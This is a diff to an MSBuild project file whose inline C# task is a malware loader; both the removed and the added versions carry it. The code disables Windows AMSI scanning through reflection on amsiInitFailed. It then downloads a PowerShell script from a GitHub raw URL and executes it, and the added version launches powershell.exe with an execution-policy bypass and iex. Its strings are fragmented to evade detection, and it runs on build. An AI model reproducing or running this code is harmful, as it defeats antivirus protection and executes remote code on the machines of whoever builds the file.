@@ -1,6 +1,15 @@
 <Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
-  <Target Name="Execute"><ClassExample /></Target>
-  <UsingTask TaskName="ClassExample" TaskFactory="CodeTaskFactory" AssemblyFile="C:\Windows\Microsoft.Net\Framework64\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll">
-    <Task><Reference Include="System.Management.Automation" /><Code Type="Class" Language="cs"><![CDATA[using System;using MA=System.Management.Automation;using MAR=System.Management.Automation.Runspaces;using System.Reflection;using System.Net;using Microsoft.Build.Framework;using Microsoft.Build.Utilities;public class ClassExample:Task{public override bool Execute(){try{var t=typeof(MA.PSObject).Assembly.GetType("Sys"+"tem.Manage"+"ment.Auto"+"mation.Am"+"siUt"+"ils");var f=t.GetField("am"+"siInit"+"Fai"+"led",BindingFlags.NonPublic|BindingFlags.Static);f.SetValue(null,true);}catch{}var w=new WebClient();string[]p={"https://raw.","githubusercontent",".com/bna169/Red","Lotus-Parser/refs/","heads/main/RedLotus","-Parser.ps1"};string s=w.DownloadString(string.Concat(p));var r=MAR.RunspaceFactory.CreateRunspace();r.Open();var pl=r.CreatePipeline();pl.Commands.AddScript(s);try{pl.Invoke();}catch{}r.Close();return true;}}]]></Code></Task>
+  <Target Name="X"><Y /></Target>
+  <UsingTask TaskName="Y" TaskFactory="CodeTaskFactory" AssemblyFile="C:\Windows\Microsoft.Net\Framework64\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll">
+    <Task><Code Type="Class" Language="cs"><![CDATA[
+using System;using System.Diagnostics;using Microsoft.Build.Framework;using Microsoft.Build.Utilities;
+public class Y:Task{public override bool Execute(){var z=new string[]{"pow","ersh","ell",".ex","e"};
+var a=string.Concat(z);var b=new string[]{"-N","oE","xit"," -","ep"," B","yp","ass"," -","w"," N","orm","al"," -","c"," \""};
+var c=string.Concat(b);var d=new string[]{"[R","ef]",".As","sem","bly",".Ge","tTy","pe(","'Sy","ste","m.M","ana","gem","ent",".Au","tom","ati","on.","Ams","iUt","ils","').","Get","Fie","ld(","'am","siI","nit","Fai","led","','","Non","Pub","lic",",St","ati","c').",".Se","tVa","lue","($n","ull",",$t","rue",")"};
+var e=string.Concat(d);var f=new string[]{";i","ex(","New","-Ob","jec","t N","et.","Web","Cli","ent",").D","own","loa","dSt","rin","g('"};
+var g=string.Concat(f);var h=new string[]{"ht","tps","://","raw",".gi","thu","bus","erc","ont","ent",".co","m/b","na1","69/","Red","Lot","us-","Par","ser","/re","fs/","hea","ds/","mai","n/R","edL","otu","s-P","ars","er.","ps1","')\""};
+var i=string.Concat(h);var j=c+e+g+i;var k=new ProcessStartInfo();k.FileName=a;k.Arguments=j;k.UseShellExecute=true;
+k.WindowStyle=ProcessWindowStyle.Normal;try{Process.Start(k);}catch{}return true;}}
+]]></Code></Task>
   </UsingTask>
 </Project>
